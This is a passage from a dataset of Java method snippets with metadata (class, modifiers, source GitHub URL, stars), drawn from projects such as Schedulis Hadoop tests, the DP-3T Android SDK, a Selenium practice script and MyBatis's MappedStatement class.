HadoopJobUtils.resolveWildCardForJarSpec(workingDirString, \"./lib/*\", logger);\n    Set<String> retvalSet = new HashSet<String>(Arrays.asList(retval.split(\",\")));\n\n    Set<String> expected = new HashSet<String>();\n    expected.add(\"/tmp/TestHadoopSpark/./lib/library.jar\");\n    expected.add(\"/tmp/TestHadoopSpark/./lib/hadoop-spark-job-test-execution-x.y.z-a.b.c.jar\");\n\n    Assert.assertTrue(\"Expected size is different from retrieval size. Expected: \" + expected + \" , Actual: \" + retvalSet,\n                      expected.size() == retvalSet.size());\n    expected.removeAll(retvalSet);\n    Assert.assertTrue(\"Expected values are not equal to Actual values. Expected: \" + expected + \" , Actual: \" + retvalSet,\n                      expected.isEmpty() );\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56865, "method_name": "testTwoLibFolderExpansionAllFilesResolved", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testTwoLibFolderExpansionAllFilesResolved() throws IOException {\n    File lib2FolderFile = new File(workingDirFile, \"lib2\");\n    lib2FolderFile.mkdirs();\n    File lib2test1Jar = new File(lib2FolderFile, \"test1.jar\");\n    lib2test1Jar.createNewFile();\n    File lib2test2Jar = new File(lib2FolderFile, \"test2.jar\");\n    lib2test2Jar.createNewFile();\n    String retval = HadoopJobUtils.resolveWildCardForJarSpec(workingDirString, \"./lib/*,./lib2/*\",\n            logger);\n\n    Assert.assertTrue(retval.contains(\"/tmp/TestHadoopSpark/./lib/library.jar\"));\n    Assert.assertTrue(retval.contains(\"/tmp/TestHadoopSpark/./lib/hadoop-spark-job-test-execution-x.y.z-a.b.c.jar\"));\n    Assert.assertTrue(retval.contains(\"/tmp/TestHadoopSpark/./lib2/test1.jar\"));\n    Assert.assertTrue(retval.contains(\"/tmp/TestHadoopSpark/./lib2/test2.jar\"));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56866, "method_name": "testTwoLibFolderExpansionExpandsInOrder", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testTwoLibFolderExpansionExpandsInOrder() throws IOException {\n\n      executionJarFile.delete();\n\n      File lib2FolderFile = new File(workingDirFile, \"lib2\");\n      lib2FolderFile.mkdirs();\n      File lib2test1Jar = new File(lib2FolderFile, \"test1.jar\");\n      lib2test1Jar.createNewFile();\n\n      String retval = HadoopJobUtils.resolveWildCardForJarSpec(workingDirString, \"./lib/*,./lib2/*\",\n              logger);\n\n      Assert.assertEquals(\n              retval,\n              \"/tmp/TestHadoopSpark/./lib/library.jar,/tmp/TestHadoopSpark/./lib2/test1.jar\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56867, "method_name": "write", "class_name": "DayDateJsonAdapter", "params": ["JsonWriter", "DayDate"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(JsonWriter out, DayDate value) throws IOException {\n\t\tout.value(value.formatAsString());\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/util/DayDateJsonAdapter.java", "stars": "139", "class_props": {"extends": "TypeAdapter", "implements": null, "modifiers": []}}, {"id": 56868, "method_name": "read", "class_name": "DayDateJsonAdapter", "params": ["JsonReader"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "DayDate", "snippet": "\tpublic DayDate read(JsonReader in) throws IOException {\n\t\tString value = in.nextString();\n\t\ttry {\n\t\t\treturn new DayDate(value);\n\t\t} catch (ParseException e) {\n\t\t\tthrow new IOException(\"Unexpected DayDate format \" + value, e);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/util/DayDateJsonAdapter.java", "stars": "139", "class_props": {"extends": "TypeAdapter", "implements": null, "modifiers": []}}, {"id": 56869, "method_name": "main", "class_name": "MyntraClass", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException { \n\t\t\n\t\t// Launching the application \n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"./drivers/chromedriver.exe\"); \n\t\tChromeOptions options = new ChromeOptions(); \n\t\toptions.addArguments(\"--disable-notifications\"); \n\t\tdriver = new ChromeDriver(options); \n\t\tdriver.get(\"https://www.myntra.com/\"); \n\t\tdriver.manage().window().maximize(); \n\t\tdriver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS); \n\t\t\n\t\t// Navigating to the Jackets and Coats item list from Women menu \n\t\tActions act = new Actions(driver);\n\t\tWebElement womenMenu = driver.findElementByXPath(\"(//a[text()='Women'])[1]\"); \n\t\tact.moveToElement(womenMenu).build().perform(); \n\t\tdriver.findElementByLinkText(\"Jackets & Coats\").click(); \n\t\t\n\t\t// Getting the Total count of Jackets and Coats \n\t\tString rawjcStr = driver.findElementByXPath(\"//span[@class='title-count']\").getText();\n\t\tString refinedjcStr = rawjcStr.replaceAll(\"\\\\D\", \"\"); \n\t\tint jcTotalCount = Integer.parseInt(refinedjcStr); \n\t\tSystem.out.println(\"Count of Jackets and Coats: \" + jcTotalCount); \n\t\t\n\t\t// Getting the count of Jackets \n\t\tString rawJacketStr = driver.findElementByXPath(\"//label[text()='Jackets']//span\").getText(); \n\t\tString refinedJacketStr = rawJacketStr.replaceAll(\"\\\\D\", \"\"); \n\t\tint jacketsCount = Integer.parseInt(refinedJacketStr); \n\t\tSystem.out.println(\"Count of Jackets alone: \" + jacketsCount); \n\t\t\n\t\t// Getting the count of Coats \n\t\tString rawCoatStr = driver.findElementByXPath(\"//label[text()='Coats']//span\").getText(); \n\t\tString refinedCoatStr = rawCoatStr.replaceAll(\"\\\\D\", \"\"); \n\t\tint coatsCount = Integer.parseInt(refinedCoatStr); \n\t\tSystem.out.println(\"Count of Coats alone: \" + coatsCount);  \n\t\t\n\t\t//Verifying the Title Count \n\t\tif(jacketsCount + coatsCount == jcTotalCount) {\n\t\t\tSystem.out.println(\"Sum of Categories count matches with Total count of Jackets and Coats.\");\n\t\t} else {\n\t\t\tSystem.out.println(\"Sum of categories not matching.\");\n\t\t}\n\t\t\t \n\t\t// Clicking on the Coats filter \n\t\tdriver.findElementByXPath(\"//label[text()='Coats']\").click(); \n\t\t\n\t\tThread.sleep(3000);\n\t\t// Clicking the More options from Brand filter \n\t\tdriver.findElementByXPath(\"//div[@class='brand-more']\").click();\n\t\t\t\n\t\t// Searching the Brand MANGO \n\t\tdriver.findElementByXPath(\"//input[@placeholder='Search brand']\").sendKeys(\"MANGO\"); \n\t\tdriver.findElementByXPath(\"(//label[text()='MANGO'])[2]\").click();\n\t\tdriver.findElementByXPath(\"//span[@class='myntraweb-sprite FilterDirectory-close sprites-remove']\").click();\n\t\t\n\t\t// Checking the Brand and count \n\t\tThread.sleep(5000);\n\t\tList<WebElement> allProducts = driver.findElementsByXPath(\"//h3[@class='product-brand']\"); \n\t\tint mangoCount = 0; \n\t\tfor (WebElement eachProduct : allProducts) {\n\t\t\tif(eachProduct.getText().equals(\"MANGO\")) {\n\t\t\t\tmangoCount = mangoCount + 1; \n\t\t\t}\n\t\t}\n\t\t\n\t\tif(mangoCount == allProducts.size()) {\n\t\t\tSystem.out.println(\"All products are MANGO brand.\");\n\t\t} else {\n\t\t\tSystem.out.println(\"Displaying other brands too.\");\n\t\t}\n\t\t\n\t\t// Sorting the items in the list \n\t\tact.moveToElement(driver.findElementByClassName(\"sort-sortBy\")).build().perform(); \n\t\tdriver.findElementByXPath(\"//label[text()='Better Discount']\").click(); \n\t\t\n\t\tThread.sleep(5000);\n\t\t// Getting the Price of First displayed item \n\t\tList<WebElement> allPrice = driver.findElementsByXPath(\"//span[@class='product-discountedPrice']\"); \n\t\tSystem.out.println(\"Discounted Price of the first item: \" + allPrice.get(0).getText());\n\t\t\n\t\t// Clicking on the Wishlist button of first item \n\t\tact.moveToElement(driver.findElementByClassName(\"product-productMetaInfo\")).build().perform();\n\t\tdriver.findElementByXPath(\"(//span[text()='wishlist now'])[1]\").click(); \n\t\t\n\t\t//driver.close();\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/githubvin/VinSeleniumLab/master/SeleniumWorkout/src/main/java/plainseleniumscripts/MyntraClass.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56870, "method_name": "main", "class_name": "Demo04Test", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        //1.\u521b\u5efaInputStreamReader\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012\u5b57\u8282\u8f93\u5165\u6d41\u548c\u6307\u5b9a\u7684\u7f16\u7801\u8868\u540d\u79f0GBK\n        InputStreamReader isr = new InputStreamReader(new FileInputStream(\"10_IO\\\\\u6211\u662fGBK\u683c\u5f0f\u7684\u6587\u672c.txt\"),\"GBK\");\n        //2.\u521b\u5efaOutputStreamWriter\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012\u5b57\u8282\u8f93\u51fa\u6d41\u548c\u6307\u5b9a\u7684\u7f16\u7801\u8868\u540d\u79f0UTF-8\n        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"10_IO\\\\\u6211\u662futf_8\u683c\u5f0f\u7684\u6587\u4ef6.txt\"),\"UTF-8\");\n        //3.\u4f7f\u7528InputStreamReader\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5read\u8bfb\u53d6\u6587\u4ef6\n        int len = 0;\n        while((len = isr.read())!=-1){\n            //4.\u4f7f\u7528OutputStreamWriter\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5write,\u628a\u8bfb\u53d6\u7684\u6570\u636e\u5199\u5165\u5230\u6587\u4ef6\u4e2d\n            osw.write(len);\n        }\n        //5.\u91ca\u653e\u8d44\u6e90\n        osw.close();\n        isr.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo03/ReverseStream/Demo04Test.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56871, "method_name": "createRefreshableView", "class_name": "PullToRefreshWebView2", "params": ["Context", "AttributeSet"], "throws": null, "modifiers": ["protected"], "return_type": "WebView", "snippet": "\tprotected WebView createRefreshableView(Context context, AttributeSet attrs) {\n\t\tWebView webView = super.createRefreshableView(context, attrs);\n\n\t\t// Need to add JS Interface so we can get the response back\n\t\tmJsCallback = new JsValueCallback();\n\t\twebView.addJavascriptInterface(mJsCallback, JS_INTERFACE_PKG);\n\n\t\treturn webView;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/extras/PullToRefreshWebView2.java", "stars": "74", "class_props": {"extends": "PullToRefreshWebView", "implements": null, "modifiers": ["public"]}}, {"id": 56872, "method_name": "isReadyForPullStart", "class_name": "PullToRefreshWebView2", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullStart() {\n\t\t// Call Javascript...\n\t\tgetRefreshableView().loadUrl(DEF_JS_READY_PULL_DOWN_CALL);\n\n\t\t// Response will be given to JsValueCallback, which will update\n\t\t// mIsReadyForPullDown\n\n\t\treturn mIsReadyForPullDown.get();\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/extras/PullToRefreshWebView2.java", "stars": "74", "class_props": {"extends": "PullToRefreshWebView", "implements": null, "modifiers": ["public"]}}, {"id": 56873, "method_name": "isReadyForPullEnd", "class_name": "PullToRefreshWebView2", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullEnd() {\n\t\t// Call Javascript...\n\t\tgetRefreshableView().loadUrl(DEF_JS_READY_PULL_UP_CALL);\n\n\t\t// Response will be given to JsValueCallback, which will update\n\t\t// mIsReadyForPullUp\n\n\t\treturn mIsReadyForPullUp.get();\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/extras/PullToRefreshWebView2.java", "stars": "74", "class_props": {"extends": "PullToRefreshWebView", "implements": null, "modifiers": ["public"]}}, {"id": 56874, "method_name": "isReadyForPullUpResponse", "class_name": "JsValueCallback", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void isReadyForPullUpResponse(boolean response) {\n\t\t\tmIsReadyForPullUp.set(response);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/extras/PullToRefreshWebView2.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["final"]}}, {"id": 56875, "method_name": "isReadyForPullDownResponse", "class_name": "JsValueCallback", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void isReadyForPullDownResponse(boolean response) {\n\t\t\tmIsReadyForPullDown.set(response);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/extras/PullToRefreshWebView2.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["final"]}}, {"id": 56876, "method_name": "main", "class_name": "PrintLetters", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t//            01234\n\t\tString str = \"Hello World!\";\n\t\t//System.out.println(str.charAt(0)); // H\n\t\t\n\t\tfor(int i = 0; i < str.length(); i++) {\n\t\t\tif(str.charAt(i) == ' ' || str.charAt(i) == '!') {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tSystem.out.println(str.charAt(i));\n\t\t}\n\t\t\n\t\t/**\n\t\t * h\n\t\t * e\n\t\t * l\n\t\t * l\n\t\t * o\n\t\t */\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day14/PrintLetters.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56877, "method_name": "getKeyGenerator", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KeyGenerator", "snippet": "  public KeyGenerator getKeyGenerator() {\n    return keyGenerator;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56878, "method_name": "getSqlCommandType", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SqlCommandType", "snippet": "  public SqlCommandType getSqlCommandType() {\n    return sqlCommandType;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56879, "method_name": "getResource", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getResource() {\n    return resource;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56880, "method_name": "getConfiguration", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Configuration", "snippet": "  public Configuration getConfiguration() {\n    return configuration;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56881, "method_name": "getId", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56882, "method_name": "hasNestedResultMaps", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasNestedResultMaps() {\n    return hasNestedResultMaps;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56883, "method_name": "getFetchSize", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getFetchSize() {\n    return fetchSize;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56884, "method_name": "getTimeout", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getTimeout() {\n    return timeout;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56885, "method_name": "getStatementType", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StatementType", "snippet": "  public StatementType getStatementType() {\n    return statementType;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56886, "method_name": "getResultSetType", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultSetType", "snippet": "  public ResultSetType getResultSetType() {\n    return resultSetType;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56887, "method_name": "getSqlSource", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource getSqlSource() {\n    return sqlSource;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56888, "method_name": "getParameterMap", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterMap", "snippet": "  public ParameterMap getParameterMap() {\n    return parameterMap;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56889, "method_name": "getResultMaps", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ResultMap>", "snippet": "  public List<ResultMap> getResultMaps() {\n    return resultMaps;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56890, "method_name": "getCache", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cache", "snippet": "  public Cache getCache() {\n    return cache;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56891, "method_name": "isFlushCacheRequired", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFlushCacheRequired() {\n    return flushCacheRequired;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56892, "method_name": "isUseCache", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isUseCache() {\n    return useCache;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56893, "method_name": "isResultOrdered", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isResultOrdered() {\n    return resultOrdered;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56894, "method_name": "getDatabaseId", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDatabaseId() {\n    return databaseId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56895, "method_name": "getKeyProperties", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getKeyProperties() {\n    return keyProperties;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56896, "method_name": "getKeyColumns", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getKeyColumns() {\n    return keyColumns;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56897, "method_name": "getStatementLog", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Log", "snippet": "  public Log getStatementLog() {\n    return statementLog;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56898, "method_name": "getLang", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LanguageDriver", "snippet": "  public LanguageDriver getLang() {\n    return lang;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56899, "method_name": "getResultSets", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getResultSets() {\n    return resultSets;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56900, "method_name": "getResulSets", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getResulSets() {\n    return resultSets;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56901, "method_name": "getBoundSql", "class_name": "MappedStatement", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "BoundSql", "snippet": "  public BoundSql getBoundSql(Object parameterObject) {\n    BoundSql boundSql = sqlSource.getBoundSql(parameterObject);\n    List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n    if (parameterMappings == null || parameterMappings.isEmpty()) {\n      boundSql = new BoundSql(configuration, boundSql.getSql(), parameterMap.getParameterMappings(), parameterObject);\n    }\n\n    // check for nested result maps in parameter mappings (issue #30)\n    for (ParameterMapping pm : boundSql.getParameterMappings()) {\n      String rmId = pm.getResultMapId();\n      if (rmId != null) {\n        ResultMap rm = configuration.getResultMap(rmId);\n        if (rm != null) {\n          hasNestedResultMaps |= rm.hasNestedResultMaps();\n        }\n      }\n    }\n    return boundSql;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56902, "method_name": "delimitedStringToArray", "class_name": "MappedStatement", "params": ["String"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "  private static String[] delimitedStringToArray(String in) {\n    if (in == null || in.trim().length() == 0) {\n      return null;\n    } else {\n      return in.split(\",\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56903, "method_name": "resource", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resource(String resource) {\n      mappedStatement.resource = resource;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56904, "method_name": "id", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String id() {\n      return mappedStatement.id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56905, "method_name": "parameterMap", "class_name": "Builder", "params": ["ParameterMap"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder parameterMap(ParameterMap parameterMap) {\n      mappedStatement.parameterMap = parameterMap;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56906, "method_name": "resultMaps", "class_name": "Builder", "params": ["List<ResultMap>"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultMaps(List<ResultMap> resultMaps) {\n      mappedStatement.resultMaps = resultMaps;\n      for (ResultMap resultMap : resultMaps) {\n        mappedStatement.hasNestedResultMaps = mappedStatement.hasNestedResultMaps || resultMap.hasNestedResultMaps();\n      }\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56907, "method_name": "fetchSize", "class_name": "Builder", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder fetchSize(Integer fetchSize) {\n      mappedStatement.fetchSize = fetchSize;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56908, "method_name": "timeout", "class_name": "Builder", "params": 